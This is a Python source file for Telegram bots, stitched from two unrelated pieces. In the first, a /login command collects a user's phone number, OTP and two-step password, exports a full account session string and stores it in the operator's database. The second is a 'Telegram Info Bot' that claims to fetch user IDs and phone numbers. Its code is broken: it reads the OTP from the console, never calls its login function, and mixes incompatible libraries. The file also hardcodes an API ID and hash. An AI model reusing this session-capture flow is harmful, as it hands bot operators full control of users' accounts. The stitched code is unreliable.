import asyncio
import logging
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, ConversationHandler
from telegram import Update
from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError
#devggn


from pyrogram import filters, Client
from devgagan import app
from pyromod import listen
import random
import os
import string
from devgagan.core.mongo import db
from devgagan.core.func import subscribe, chk_user
from config import API_ID as api_id, API_HASH as api_hash
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait
)

def generate_random_name(length=7):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))  # Editted ... 

async def delete_session_files(user_id):
    session_file = f"session_{user_id}.session"
    memory_file = f"session_{user_id}.session-journal"

    session_file_exists = os.path.exists(session_file)
    memory_file_exists = os.path.exists(memory_file)

    if session_file_exists:
        os.remove(session_file)
    
    if memory_file_exists:
        os.remove(memory_file)

    # Delete session from the database
    if session_file_exists or memory_file_exists:
        await db.delete_session(user_id)
        return True  # Files were deleted
    return False  # No files found

@app.on_message(filters.command("logout"))
async def clear_db(client, message):
    user_id = message.chat.id
    files_deleted = await delete_session_files(user_id)

    if files_deleted:
        await message.reply("✅ Your session data and files have been cleared from memory and disk.")
    else:
        await message.reply("⚠️ You are not logged in, no session data found.")
        
    
@app.on_message(filters.command("login"))
async def generate_session(_, message):
    joined = await subscribe(_, message)
    if joined == 1:
        return
        
    # user_checked = await chk_user(message, message.from_user.id)
    # if user_checked == 1:
        # return
        
    user_id = message.chat.id   
    
    number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)   
    phone_number = number.text
    try:
        await message.reply("📲 Sending OTP...")
        client = Client(f"session_{user_id}", api_id, api_hash)
        
        await client.connect()
    except Exception as e:
        await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
    try:
        code = await client.send_code(phone_number)
    except ApiIdInvalid:
        await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
        return
    except PhoneNumberInvalid:
        await message.reply('❌ Invalid phone number. Please restart the session.')
        return
    try:
        otp_code = await _.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
    except TimeoutError:
        await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
        return
    phone_code = otp_code.text.replace(" ", "")
    try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
                
    except PhoneCodeInvalid:
        await message.reply('❌ Invalid OTP. Please restart the session.')
        return
    except PhoneCodeExpired:
        await message.reply('❌ Expired OTP. Please restart the session.')
        return
    except SessionPasswordNeeded:
        try:
            two_step_msg = await _.ask(user_id, 'Your account has two-step verification enabled. Please enter your password.', filters=filters.text, timeout=300)
        except TimeoutError:
            await message.reply('⏰ Time limit of 5 minutes exceeded. Please restart the session.')
            return
        try:
            password = two_step_msg.text
            await client.check_password(password=password)
        except PasswordHashInvalid:
            await two_step_msg.reply('❌ Invalid password. Please restart the session.')
            return
    string_session = await client.export_session_string()
    await db.set_session(user_id, string_session)
    await client.disconnect()
    await otp_code.reply("✅ Login successful!")

# Telegram API credentials
api_id = "24894984"  # Replace with your actual API ID
api_hash = "4956e23833905463efb588eb806f9804"  # Replace with your actual API hash
phone = "+91..."  # Replace with your phone number

client = TelegramClient('session_name', api_id, api_hash)

# Ensure asyncio loop is created
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# Track login status
user_logged_in = False
user_history = {}

# Setup logging for debugging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Define states for conversation
PHONE = 1

# /start command
def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text(
        "Hey User! 👋\n"
        "Welcome to the Telegram Info Bot.\n\n"
        "Commands you can use:\n"
        "/login - Login to your Telegram account\n"
        "/help - Get more info about bot features 🎉\n\n"
        "Note: \n"
        "I can help you fetch user IDs and mobile numbers after logging in. "
        "You can also check your own information after successful login."
    )

# /help command
def help_command(update: Update, context: CallbackContext) -> None:
    update.message.reply_text(
        "ℹ️ This bot allows you to access some of your Telegram information.\n\n"
        "⚙️ Available Commands:\n"
        "/start - Start the bot\n"
        "/login - Login to your Telegram account\n"
        "/help - Show this message"
    )

# Request for the phone number (with +91 prefix)
def phone_number(update: Update, context: CallbackContext) -> int:
    update.message.reply_text(
        "Please enter your phone number in the following format:\n"
        "+91XXXXXXXXXX"
    )
    return PHONE

# Async login function after receiving phone number
async def async_login(update: Update, context: CallbackContext, phone_number: str) -> None:
    global user_logged_in

    # Use the phone number entered by user
    phone = phone_number
    
    await client.start()
    
    if not await client.is_user_authorized():
        await client.send_code_request(phone)
        update.message.reply_text("🛡️ A login code has been sent to your Telegram. Please enter it below:")

        try:
            code = input("Enter the code (OTP): ")
            await client.sign_in(phone, code)
        except SessionPasswordNeededError:
            password = input("🔐 Enter your 2FA password: ")
            await client.sign_in(password=password)
    
    me = await client.get_me()
    update.message.reply_text(f"✅ Login successful! Welcome {me.first_name} ({me.username})\n\n"
                              f"Your ID: {me.id}\nYour Phone: {me.phone}")
    user_logged_in = True

    # Save the user's username to history
    user_history[update.effective_user.id] = me.username

# /login command (dispatcher to call async function)
def login(update: Update, context: CallbackContext) -> None:
    update.message.reply_text(
        "To log in, I need your phone number.\n"
        "Please enter your phone number in the format: +91XXXXXXXXXX"
    )
    return PHONE

# Handle forwarded messages and retrieve username history
def handle_forwarded_message(update: Update, context: CallbackContext) -> None:
    if not user_logged_in:
        update.message.reply_text(
            "🚫 Pehle login karein! 🔑\n\n"
            "Aapko /login command ka use karke apne Telegram account se connect karna hoga. "
            "Uske baad hi main aapki madad kar sakta hoon. 😊"
        )
        return

    # If message is forwarded, extract sender's info
    if update.message.forward_from:
        forwarded_user = update.message.forward_from
        sender_id = forwarded_user.id
        sender_username = forwarded_user.username if forwarded_user.username else "No username"

        # Check if the sender's history is available
        history = user_history.get(sender_id, None)

        if history:
            update.message.reply_text(f"User {sender_username} has previously logged in with the username: {history}")
        else:
            update.message.reply_text(f"User {sender_username} does not have a previous login history.")

# Unauthorized message handler (before login)
def handle_unauthorized_messages(update: Update, context: CallbackContext) -> None:
    if not user_logged_in:
        update.message.reply_text(
            "🚫 Aapko pehle login karna hoga! 🔑\n\n"
            "Aapko /login command ka use karke apne Telegram account se connect karna hoga. "
            "Uske baad hi main aapki madad kar sakta hoon. 😊"
        )
    else:
        update.message.reply_text(
            "❓ Main samajh nahi paya. Kripya sahi command ka istemal karein.\n\n"
            "Available Commands:\n"
            "/start - Bot ko start karein\n"
            "/help - Madad ke liye\n"
            "/login - Apne Telegram se connect karein"
        )

# Conversation handler
def conversation_handler() -> ConversationHandler:
    return ConversationHandler(
        entry_points=[CommandHandler('login', login)],  # /login command triggers this conversation
        states={
            PHONE: [MessageHandler(Filters.text & ~Filters.command, phone_number)],
        },
        fallbacks=[],
    )

# Main function to run the bot
def main():
    TOKEN = "YOUR_BOT_TOKEN"  # Replace with your actual bot token
    updater = Updater(TOKEN)
    dp = updater.dispatcher

    # Enable logging
    logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                        level=logging.DEBUG)

    # Command Handlers
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help_command))
    
    # Handle login process
    dp.add_handler(conversation_handler())
    
    # Handle messages that are not commands
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_unauthorized_messages))

    # Handle forwarded messages to track username history
    dp.add_handler(MessageHandler(Filters.forwarded, handle_forwarded_message))

    # Start Bot Polling
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
